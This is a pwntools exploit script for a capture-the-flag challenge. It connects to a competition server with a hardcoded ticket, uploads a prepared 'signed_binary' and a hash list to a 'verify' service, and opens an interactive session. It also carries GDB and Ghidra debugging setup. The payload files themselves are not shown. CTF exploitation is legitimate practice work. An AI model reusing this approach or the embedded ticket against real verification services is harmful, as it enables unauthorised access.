#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('verify')

host = args.HOST or 'seedling-d22fuls4bf566.shellweplayaga.me'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, api=True, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please: ',b'ticket{AssociationListing2720n23:DEpawaYMXKFMlF-EbtM0kaUG5KLhluZzz6n-xb3nsldUES9w}')
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def getPIEBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").read().splitlines()
    return int(memory_map[0].split(b"-")[0], 16)


context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
decompiler connect ghidra
b *verify_binary+59
continue
'''.format(**locals())

# -- Exploit goes here --

io = start(['key.txt'])

# if args.GDB:
#     pie_base = getPIEBase(io)
#     print(f'{pie_base = :x}')
#     io.gdb.execute(f'decompiler connect ghidra')
#     io.gdb.execute(f'b *main')

#     io.gdb.execute(f'c')


data = open('signed_binary','rb').read()
print(len(data))
io.sendlineafter(b'(max 16384)\n',str(len(data)).encode())
io.sendafter(b'goods:\n',data)

data = open('hashes.txt','r').read()
print(len(data))
io.sendlineafter(b'(max 48)\n',str(len(data.splitlines())).encode())
io.sendafter(b'(index:hash)\n',data)

io.interactive()

